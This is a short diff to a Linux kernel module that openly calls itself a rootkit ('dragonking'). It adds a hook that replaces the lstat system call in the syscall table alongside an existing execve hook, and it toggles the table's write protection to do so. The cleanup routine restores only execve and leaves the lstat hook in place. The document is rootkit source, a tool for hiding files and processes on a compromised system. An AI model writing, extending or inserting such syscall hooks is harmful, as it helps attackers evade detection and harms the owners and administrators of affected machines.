@@ -38,6 +38,8 @@ static int __init dragonking_init(void)
 	orig_execve = (void *)sys_call_table[__NR_execve];
 	//Replace original pointer with ours
 	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
+	orig_lstat = (void *)sys_call_table[__NR_lstat];
+	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
 	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
 	printk(KERN_INFO "This is a rootkit.\n");
@@ -49,7 +51,6 @@ static void __exit dragonking_cleanup(void)
 	    set_addr_rw((unsigned long) sys_call_table);
 	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
 	    set_addr_ro((unsigned long) sys_call_table);
-            printk(KERN_INFO "");
 	    printk(KERN_INFO "Rootkit removed.\n");
 }
 
